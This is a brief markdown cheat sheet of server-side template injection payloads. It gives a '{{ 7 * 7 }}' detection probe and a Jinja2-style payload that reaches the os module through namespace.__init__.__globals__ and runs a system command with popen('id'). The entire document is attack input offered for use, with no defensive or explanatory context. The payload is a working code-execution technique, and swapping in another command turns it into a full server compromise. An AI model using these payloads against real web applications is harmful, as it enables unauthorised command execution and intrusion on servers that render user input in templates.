###h3 SSTI Payloads

##Test Payloads
```
{{ 7 * 7 }}
```
```
Test for System Execution
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
